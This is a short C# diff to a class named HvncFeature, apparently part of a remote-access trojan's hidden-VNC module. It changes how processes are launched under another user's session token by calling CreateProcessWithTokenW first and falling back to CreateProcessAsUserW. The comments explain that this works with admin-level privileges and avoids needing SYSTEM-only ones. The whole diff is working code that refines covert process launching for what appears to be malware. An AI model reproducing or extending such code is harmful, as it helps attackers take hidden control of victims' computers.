@@ -145,6 +145,12 @@ internal static class HvncFeature
     static extern bool CreateProcessAsUserW(nint hToken, nint lpApp, System.Text.StringBuilder lpCmd,
         nint pa, nint ta, bool inherit, uint flags, nint lpEnv, nint dir,
         ref STARTUPINFOW si, out PROCESS_INFORMATION pi);
+    // Requires only SeImpersonatePrivilege (always present in elevated admin tokens),
+    // unlike CreateProcessAsUserW which requires SeAssignPrimaryTokenPrivilege (SYSTEM only).
+    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
+    static extern bool CreateProcessWithTokenW(nint hToken, uint dwLogonFlags, nint lpApp,
+        System.Text.StringBuilder lpCmd, uint flags, nint lpEnv, nint dir,
+        ref STARTUPINFOW si, out PROCESS_INFORMATION pi);
     [DllImport("wtsapi32.dll")] static extern bool WTSQueryUserToken(uint sessionId, out nint phToken);
     [DllImport("kernel32.dll")] static extern uint WTSGetActiveConsoleSessionId();
     [DllImport("userenv.dll")]  static extern bool CreateEnvironmentBlock(out nint lpEnv, nint hToken, bool bInherit);
@@ -2161,11 +2167,11 @@ internal static class HvncFeature
             PROCESS_INFORMATION pi;
             if (launchToken != 0)
             {
-                // CreateProcessAsUserW requires these privileges to be active in the caller's token.
-                // They are present in elevated-admin tokens but not enabled by default.
-                Protection.EnablePrivilege(3);  // SeAssignPrimaryTokenPrivilege
-                Protection.EnablePrivilege(5);  // SeIncreaseQuotaPrivilege
-                CreateProcessAsUserW(launchToken, 0, sb, 0, 0, false, createFlags, envBlock, 0, ref si, out pi);
+                // CreateProcessWithTokenW only needs SeImpersonatePrivilege (always present in
+                // elevated admin tokens). CreateProcessAsUserW would require SeAssignPrimaryToken +
+                // SeIncreaseQuota which are only in SYSTEM tokens, not standard admin tokens.
+                if (!CreateProcessWithTokenW(launchToken, 0, 0, sb, createFlags, envBlock, 0, ref si, out pi))
+                    CreateProcessAsUserW(launchToken, 0, sb, 0, 0, false, createFlags, envBlock, 0, ref si, out pi);
             }
             else
             {
